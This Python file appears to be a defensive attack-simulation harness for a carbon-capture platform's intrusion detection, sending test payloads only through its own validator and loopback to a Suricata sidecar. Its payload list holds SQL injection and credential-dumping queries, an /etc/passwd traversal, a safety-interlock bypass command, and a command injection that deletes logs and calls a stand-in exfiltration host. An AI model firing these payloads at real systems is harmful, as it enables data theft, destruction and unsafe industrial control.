"""
attack_sim/attacker.py

Standalone offensive-simulation script for EcoCapture OS.

PURPOSE: This script is executed as a SEPARATE process (or Kubernetes Job,
see carbon-platform-k8s.yaml) from the main Streamlit dashboard. It sends
a series of malicious / out-of-bounds payloads through the platform's own
security.ids.inspect_traffic() validation function - the same function
used by real ingestion paths - to prove that the IDS correctly identifies
and blocks each attack class.

In addition, each payload is ALSO sent over a real TCP loopback socket so
that a Suricata sidecar container (sharing this pod's network namespace)
can independently detect the same attacks at the network packet level.
After the simulation completes, Suricata's alert log (eve.json) is read
and relayed into the same shared audit trail, tagged with source
'Suricata-OT', so those network-layer detections appear in the dashboard
exactly like the application-layer IDS detections. A DONE_SIGNAL file is
then written so the Suricata sidecar can shut itself down cleanly and
this Job's pod can reach Completed status instead of hanging forever.

Every BLOCKED verdict (and every Suricata alert) causes a CRITICAL entry
to be appended directly to the SHARED audit trail log file
(config.settings.LOG_FILE_PATH), which in containerized deployments lives
on a shared PersistentVolumeClaim mounted by both this script and the
dashboard pod. The Streamlit UI's "Security Audit Trail" panel tails that
same file, so alerts generated here appear in the live dashboard within
seconds - no direct coupling between the two processes is required beyond
the shared filesystem path.

Every BLOCKED verdict also triggers a security_alert telemetry publish to
ThingsBoard's dedicated OT-Security-Monitor device, which raises a live
CRITICAL alarm in ThingsBoard's own native Alarms UI in real time.

This script does not target any external system - it exercises this
platform's own internal validation logic end-to-end.
"""

import json
import os
import socket
import sys
import threading
import time
from datetime import datetime, timezone

# Ensure the project root (carbon_platform/) is importable when this
# script is executed directly as `python attack_sim/attacker.py`.
_PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _PROJECT_ROOT not in sys.path:
    sys.path.insert(0, _PROJECT_ROOT)

from config import settings                      # noqa: E402
from config.audit import AuditLogger              # noqa: E402
from security.ids import inspect_traffic          # noqa: E402
from iot import thingsboard_client                # noqa: E402

_logger = AuditLogger(source="AttackSimulator")

# Path to the Suricata sidecar's alert log, shared via the 'suricata-logs'
# emptyDir volume mounted into both containers of the attack Job pod.
_SURICATA_EVE_LOG_PATH = os.environ.get(
    "SURICATA_EVE_LOG_PATH", "/var/log/suricata/eve.json"
)
_SURICATA_LOG_DIR = os.path.dirname(_SURICATA_EVE_LOG_PATH)
_SURICATA_DONE_SIGNAL_PATH = os.path.join(_SURICATA_LOG_DIR, "DONE_SIGNAL")

# Local loopback port used purely to generate real network packets for
# the Suricata sidecar to sniff (Suricata listens on the pod's 'lo'
# interface, which both containers in the pod share).
_LOOPBACK_LISTENER_PORT = 9999

# A representative battery of malicious / anomalous payloads, one per
# threat category the IDS is designed to detect.
_ATTACK_PAYLOADS = [
    {
        "label": "SQL Injection against telemetry ingestion API",
        "payload": "sensor_id=CC-01' OR '1'='1'; DROP TABLE telemetry; --",
        "target": "iot_ingest",
    },
    {
        "label": "Directory traversal against config retrieval endpoint",
        "payload": "GET /api/v1/config/../../../../etc/passwd",
        "target": "config_api",
    },
    {
        "label": "OT command injection - safety interlock bypass",
        "payload": "cmd=disable_safety_interlock;bypass_scrubber=true;force_valve=open",
        "target": "ot_control_plane",
    },
    {
        "label": "Out-of-bounds CO2 telemetry spoofing",
        "payload": '{"sensor_id": "CC-04", "co2_ppm": 999999, "temperature_c": 15.2}',
        "target": "iot_ingest",
    },
    {
        "label": "Remote command injection via facility diagnostics field",
        "payload": "diagnostics_note=maintenance ok; rm -rf /app/logs && curl http://malicious.example/exfil",
        "target": "esg_upload",
    },
    {
        "label": "Union-based SQL injection against ESG report search",
        "payload": "report_id=1 UNION SELECT username, password FROM users--",
        "target": "esg_upload",
    },
]


def _banner(text: str):
    print("=" * 78)
    print(text)
    print("=" * 78)


def _start_loopback_listener(port: int = _LOOPBACK_LISTENER_PORT):
    """
    Starts a tiny local TCP listener on loopback so that when we send
    attack payloads to it, real network packets are generated on the
    pod's 'lo' interface for the Suricata sidecar to sniff. Without
    this, payloads only exist in-process (via inspect_traffic) and
    never touch the network layer at all.
    """
    def _serve():
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind(("127.0.0.1", port))
            server.listen(5)
            while True:
                conn, _ = server.accept()
                try:
                    conn.recv(4096)
                finally:
                    conn.close()
        except Exception as exc:
            print(f"    (loopback listener stopped: {exc})")

    thread = threading.Thread(target=_serve, daemon=True)
    thread.start()
    time.sleep(1)  # give the listener a moment to bind before we send anything


def _send_payload_over_network(payload: str, port: int = _LOOPBACK_LISTENER_PORT):
    """
    Sends a payload as raw bytes over a real TCP socket to the local
    listener, generating actual loopback network traffic that Suricata
    can inspect independently of the in-process inspect_traffic() check.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect(("127.0.0.1", port))
        sock.sendall(payload.encode("utf-8", errors="ignore"))
        sock.close()
    except Exception as exc:
        print(f"    (network send warning: {exc})")


def _relay_suricata_alerts_to_audit_log(eve_path: str = None) -> int:
    """
    Reads Suricata's eve.json alert log (written by the Suricata sidecar
    container sharing this pod's network and the suricata-logs volume),
    extracts alert events, and relays each one into the main shared
    audit trail log as a CRITICAL entry with source 'Suricata-OT' - so
    it appears in the Streamlit dashboard exactly like other alerts.

    Returns the number of alerts successfully relayed.
    """
    eve_path = eve_path or _SURICATA_EVE_LOG_PATH

    if not os.path.exists(eve_path):
        print(f"    (Suricata eve.json not found yet at {eve_path} - skipping relay)")
        return 0

    try:
        with open(eve_path, "r", encoding="utf-8", errors="ignore") as f:
            lines = f.readlines()
    except Exception as exc:
        print(f"    (failed to read Suricata eve.json: {exc})")
        return 0

    relayed = 0
    for line in lines:
        line = line.strip()
        if not line:
            continue
        try:
            event = json.loads(line)
        except json.JSONDecodeError:
            continue

        if event.get("event_type") != "alert":
            continue

        alert = event.get("alert", {})
        signature = alert.get("signature", "Unknown Suricata signature")
        src_ip = event.get("src_ip", "unknown")
        dest_ip = event.get("dest_ip", "unknown")
        proto = event.get("proto", "TCP")

        _logger.log(
            "CRITICAL",
            f"[Suricata-OT] {signature} | {proto} {src_ip} -> {dest_ip}",
        )
        relayed += 1

    print(f"    Relayed {relayed} Suricata alert(s) into the audit trail.")
    return relayed


def _signal_suricata_shutdown():
    """
    Writes a DONE_SIGNAL marker file into the shared suricata-logs volume.
    The Suricata sidecar container polls for this file and shuts itself
    down cleanly once it appears, allowing this Job's pod to reach
    Completed status instead of hanging forever (Suricata never exits
    on its own otherwise, and a Kubernetes Job pod is only "done" once
    ALL of its containers have exited).
    """
    try:
        with open(_SURICATA_DONE_SIGNAL_PATH, "w") as f:
            f.write("done\n")
        print(f"Sent DONE_SIGNAL to Suricata sidecar at {_SURICATA_DONE_SIGNAL_PATH}")
    except Exception as exc:
        print(f"    (failed to write DONE_SIGNAL: {exc})")


def run_attack_simulation(delay_seconds: float = 0.75) -> dict:
    """
    Executes the full battery of simulated attack payloads against the
    platform's own IDS validation path (application layer) AND against
    the Suricata sidecar (network layer), logging results to console and
    to the shared audit trail file. Also pushes a live security_alert to
    ThingsBoard for every blocked payload, triggering a real ThingsBoard
    Alarm.

    Returns a summary dict of the run.
    """
    _banner(f"EcoCapture OS :: Attack Simulation Run @ {datetime.now(timezone.utc).isoformat()}")
    print(f"Target log file: {settings.LOG_FILE_PATH}")
    print(f"Total payloads to fire: {len(_ATTACK_PAYLOADS)}\n")

    print("Starting local network listener for Suricata packet capture...")
    _start_loopback_listener()

    _logger.info(
        f"Attack simulation run STARTED | payload_count={len(_ATTACK_PAYLOADS)}"
    )

    blocked_count = 0
    allowed_count = 0
    results = []

    for i, attack in enumerate(_ATTACK_PAYLOADS, start=1):
        print(f"[{i}/{len(_ATTACK_PAYLOADS)}] Firing: {attack['label']}")
        print(f"    Target subsystem : {attack['target']}")
        print(f"    Payload          : {attack['payload'][:100]}")

        verdict = inspect_traffic(attack["payload"], source=attack["target"])

        # Also send the same payload over a real network socket so the
        # Suricata sidecar (sniffing this pod's loopback interface) can
        # independently detect it at the network layer.
        _send_payload_over_network(attack["payload"])

        if verdict["status"] == "BLOCKED":
            blocked_count += 1
            print(f"    RESULT           : \033[91mBLOCKED\033[0m ({verdict['category']})")
            # inspect_traffic() already writes a CRITICAL audit log entry
            # internally on BLOCKED verdicts. We additionally write an
            # attacker-perspective CRITICAL entry so the dashboard audit
            # trail clearly shows both the offensive action AND the
            # defensive detection, tied together for the audit reviewer.
            _logger.critical(
                f"ATTACK SIMULATION | scenario='{attack['label']}' | "
                f"target='{attack['target']}' | verdict=BLOCKED | "
                f"category={verdict['category']} | "
                f"details={verdict['details']}"
            )
            # Push a live security alert to ThingsBoard - this triggers
            # a real CRITICAL alarm on the OT-Security-Monitor device,
            # visible immediately in ThingsBoard's native Alarms UI.
            thingsboard_client.publish_security_alert(
                scenario=attack["label"],
                category=verdict["category"],
                verdict=verdict["status"],
            )
        else:
            allowed_count += 1
            print(f"    RESULT           : \033[92mALLOWED\033[0m (unexpected - review IDS rules)")
            _logger.high(
                f"ATTACK SIMULATION | scenario='{attack['label']}' | "
                f"target='{attack['target']}' | verdict=ALLOWED | "
                "WARNING: attack payload was not blocked by IDS - rule coverage gap."
            )

        results.append({"scenario": attack["label"], "verdict": verdict["status"], "category": verdict["category"]})
        print()
        time.sleep(delay_seconds)

    summary = {
        "total_payloads": len(_ATTACK_PAYLOADS),
        "blocked": blocked_count,
        "allowed": allowed_count,
        "results": results,
        "run_completed_at": datetime.now(timezone.utc).isoformat(),
    }

    _logger.critical(
        f"Attack simulation run COMPLETED | total={summary['total_payloads']} | "
        f"blocked={blocked_count} | allowed={allowed_count} | "
        f"detection_rate={round((blocked_count / summary['total_payloads']) * 100, 1)}%"
    )

    _banner(
        f"Attack simulation complete: {blocked_count}/{len(_ATTACK_PAYLOADS)} payloads BLOCKED "
        f"({round((blocked_count / len(_ATTACK_PAYLOADS)) * 100, 1)}% detection rate)"
    )

    print("Waiting for Suricata to flush its alert log...")
    relayed_count = 0
    for attempt in range(5):
        time.sleep(3)
        relayed_count = _relay_suricata_alerts_to_audit_log()
        if relayed_count > 0:
            break
        print(f"    No Suricata alerts found yet (attempt {attempt + 1}/5), retrying...")
    summary["suricata_alerts_relayed"] = relayed_count

    # Signal the Suricata sidecar to shut down cleanly so this pod can
    # reach Completed instead of hanging forever waiting for both
    # containers to exit.
    _signal_suricata_shutdown()

    print("Check the EcoCapture OS Streamlit dashboard 'Security Audit Trail' "
          "panel and ThingsBoard's Alarms view to see these CRITICAL alerts in real time.\n")

    return summary


if __name__ == "__main__":
    run_attack_simulation()
